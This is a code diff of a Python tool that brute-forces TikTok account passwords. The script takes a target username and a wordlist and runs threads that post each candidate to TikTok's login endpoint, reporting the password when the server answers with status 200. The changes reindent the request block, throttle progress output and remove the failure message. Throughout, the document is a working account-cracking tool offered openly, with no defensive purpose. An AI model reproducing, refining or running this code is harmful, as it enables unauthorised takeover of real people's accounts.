@@ -1,6 +1,6 @@
 import requests
 from subprocess import call
-from colorama import Fore, Style, Back, init
+from colorama import Fore, Style, init
 import threading
 
 init()
@@ -11,12 +11,6 @@ reset = Style.RESET_ALL
 green = Fore.LIGHTGREEN_EX
 yellow = Fore.YELLOW
 magenta = Fore.LIGHTMAGENTA_EX
-
-adv = yellow + "[+]" + magenta
-
-call(["clear"])
-
-print()
 
 print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⢀⣼⣷⣦⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣩⠙⢷⣦⠀⣴⣿⣿⠃⢀⣄⢠⡞⠉⠝⠩⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -53,6 +47,14 @@ print()
 print()
 print()
 
+adv = yellow + "[+]" + magenta
+
+call(["clear"])
+
+print()
+print()
+print()
+
 print(blue + " > DO NOT ADD THE '@'")
 user = input(yellow + " > user: " + reset)
 
@@ -75,7 +77,7 @@ except ValueError:
 i = input(yellow + " > #: " + reset)
 password = None
 
-progress_interval = 500 # Adjust to your preference
+progress_interval = 500  # Adjust this interval based on your preference
 
 def brute_force_worker(user, wordlist, start_point, index):
     global password
@@ -86,46 +88,44 @@ def brute_force_worker(user, wordlist, start_point, index):
     for i in range(start_point, len(words)):
         if i % index == 0:  # Only process words that match the thread index
             word = words[i].strip()
-            print(adv, f"Thread {index} cracking account...", f"{i + 1}/{len(words)}", reset)
+            if (i + 1) % progress_interval == 0:
+                print(adv, f"Thread {index} cracking account...", f"{i + 1}/{len(words)}", reset)
             try: 
-              response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
-              "username": user,
-              "password": word,
-              "mix_mode": True,
-              "captcha": "",
-              "email": "",
-              "mobile": "",
-              "account": "",
-              "type": 1,
-              "app_id": 1233,
-              "device_id": "",
-              "iid": "",
-              "os_version": "",
-              "channel": "",
-              "device_platform": "",
-              "request_id": "",
-              "captcha_app": "",
-              "captcha_type": "",
-              "google_account": "",
-              "google_captcha": "",
-              "google_token": "",
-              "fb_account": "",
-              "fb_code": "",
-              "fb_token": "",
-              "apple_id": "",
-              "apple_token": "",
-              "apple_email": "",
-              "apple_code": "",
-              "mix_string": word
-              })
-              if response.status_code == 200:
-                password = word
-                print()
-                print(green + f" success! password is {word}" + reset)
-                return
-              else:
-                print()
-                print(red + f"failed! password not found in {wordlist}" + reset)
+                response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
+                    "username": user,
+                    "password": word,
+                    "mix_mode": True,
+                    "captcha": "",
+                    "email": "",
+                    "mobile": "",
+                    "account": "",
+                    "type": 1,
+                    "app_id": 1233,
+                    "device_id": "",
+                    "iid": "",
+                    "os_version": "",
+                    "channel": "",
+                    "device_platform": "",
+                    "request_id": "",
+                    "captcha_app": "",
+                    "captcha_type": "",
+                    "google_account": "",
+                    "google_captcha": "",
+                    "google_token": "",
+                    "fb_account": "",
+                    "fb_code": "",
+                    "fb_token": "",
+                    "apple_id": "",
+                    "apple_token": "",
+                    "apple_email": "",
+                    "apple_code": "",
+                    "mix_string": word
+                })
+                if response.status_code == 200:
+                    password = word
+                    print()
+                    print(green + f" success! password is {word}" + reset)
+                    return
             except Exception as e:
                 print()
                 print(red + f"Error: {e}. Pausing for user input..." + reset)
